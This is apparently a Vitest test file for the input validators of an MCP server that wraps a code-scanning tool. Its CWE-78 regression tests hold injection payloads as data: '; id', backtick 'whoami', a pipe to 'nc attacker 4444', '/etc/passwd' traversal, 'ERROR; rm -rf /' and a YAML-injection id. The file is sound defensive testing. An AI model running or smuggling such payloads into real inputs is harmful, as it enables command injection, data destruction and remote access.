import { describe, it, expect } from 'vitest';
import path from 'path';
import { writeFile, unlink } from 'fs/promises';
import {
  BASE_ALLOWED_PATH,
  validateAbsolutePath,
  validateNoShellMetacharacters,
  validateRuleField,
  validateRuleSeverity,
} from '../src/index.js';
import { McpError } from '@modelcontextprotocol/sdk/types.js';

describe('validateNoShellMetacharacters', () => {
  it('accepts plain ASCII paths', () => {
    expect(() => validateNoShellMetacharacters('/safe/path/file.json', 'p')).not.toThrow();
  });

  it.each([
    ['; id'], ['| id'], ['& id'], ['`id`'], ['$(id)'], ['<x>'], ['{x}'],
    ['a\nb'], ['a\rb'], ['a\\b'], ['a!b'], ['a#b'], ['a*b'], ['a?b'], ['a[b]'],
    ['a"b'], ["a'b"], ['a~b'], ['a\tb'],
  ])('rejects shell metacharacter in %s', (payload) => {
    expect(() => validateNoShellMetacharacters(payload, 'p')).toThrow(McpError);
  });
});

describe('validateAbsolutePath', () => {
  it('accepts absolute paths within BASE_ALLOWED_PATH', () => {
    const safe = path.join(BASE_ALLOWED_PATH, 'sub', 'file.json');
    expect(validateAbsolutePath(safe, 'p')).toBe(path.normalize(safe));
  });

  it('rejects relative paths', () => {
    expect(() => validateAbsolutePath('relative/file.json', 'p')).toThrow(McpError);
  });

  it('rejects absolute paths outside BASE_ALLOWED_PATH', () => {
    expect(() => validateAbsolutePath('/etc/passwd', 'p')).toThrow(McpError);
  });

  it('rejects path traversal escaping the base', () => {
    const evil = path.join(BASE_ALLOWED_PATH, '..', '..', 'etc', 'passwd');
    expect(() => validateAbsolutePath(evil, 'p')).toThrow(McpError);
  });

  it('CWE-78 regression: rejects shell metacharacters even after prefix check passes', () => {
    const payload = path.join(BASE_ALLOWED_PATH, 'poc-results.json') + '; id >&2; false; #';
    expect(() => validateAbsolutePath(payload, 'results_file')).toThrow(McpError);
  });

  it('CWE-78 regression: rejects backtick command substitution', () => {
    const payload = path.join(BASE_ALLOWED_PATH, '`whoami`.json');
    expect(() => validateAbsolutePath(payload, 'results_file')).toThrow(McpError);
  });

  it('CWE-78 regression: rejects pipe-based injection', () => {
    const payload = path.join(BASE_ALLOWED_PATH, 'a.json') + ' | nc attacker 4444';
    expect(() => validateAbsolutePath(payload, 'results_file')).toThrow(McpError);
  });

  it('config: accepts auto', () => {
    expect(validateAbsolutePath('auto', 'config')).toBe('auto');
  });

  it('config: accepts p/ and r/ registry refs', () => {
    expect(validateAbsolutePath('p/security', 'config')).toBe('p/security');
    expect(validateAbsolutePath('r/javascript.security', 'config')).toBe('r/javascript.security');
  });

  it('config: rejects shell metacharacters in registry-like values', () => {
    expect(() => validateAbsolutePath('p/security; id', 'config')).toThrow(McpError);
  });
});

describe('validateRuleField', () => {
  const RULE_ID = /^[a-zA-Z][a-zA-Z0-9_.-]{0,127}$/;
  const LANGUAGE = /^[a-zA-Z][a-zA-Z0-9_+-]{0,31}$/;

  it('accepts valid rule id', () => {
    expect(validateRuleField('my_custom_rule.v2', 'id', RULE_ID)).toBe('my_custom_rule.v2');
  });

  it('accepts valid language', () => {
    expect(validateRuleField('python', 'language', LANGUAGE)).toBe('python');
    expect(validateRuleField('c++', 'language', LANGUAGE)).toBe('c++');
  });

  it('rejects YAML-injection payload in id', () => {
    expect(() => validateRuleField('foo\n  - id: pwned', 'id', RULE_ID)).toThrow(McpError);
  });

  it('rejects shell metacharacters in language', () => {
    expect(() => validateRuleField('python; id', 'language', LANGUAGE)).toThrow(McpError);
  });
});

describe('validateRuleSeverity', () => {
  it.each(['ERROR', 'WARNING', 'INFO', 'error', 'warning', 'info'])(
    'accepts %s and normalises to upper case',
    (input) => {
      expect(validateRuleSeverity(input)).toBe(input.toUpperCase());
    }
  );

  it('rejects unknown severity', () => {
    expect(() => validateRuleSeverity('CRITICAL')).toThrow(McpError);
  });

  it('rejects severity with shell metacharacters', () => {
    expect(() => validateRuleSeverity('ERROR; rm -rf /')).toThrow(McpError);
  });
});

describe('CWE-78 end-to-end regression (filesystem read instead of shell)', () => {
  it('reads JSON via fs.readFile, not via cat shell call', async () => {
    const fixture = path.join(BASE_ALLOWED_PATH, 'cwe78-fixture.json');
    await writeFile(fixture, JSON.stringify({ results: [] }), 'utf-8');
    try {
      const fileContent = await import('fs/promises').then(m => m.readFile(fixture, 'utf-8'));
      expect(JSON.parse(fileContent)).toEqual({ results: [] });
    } finally {
      await unlink(fixture).catch(() => undefined);
    }
  });
});
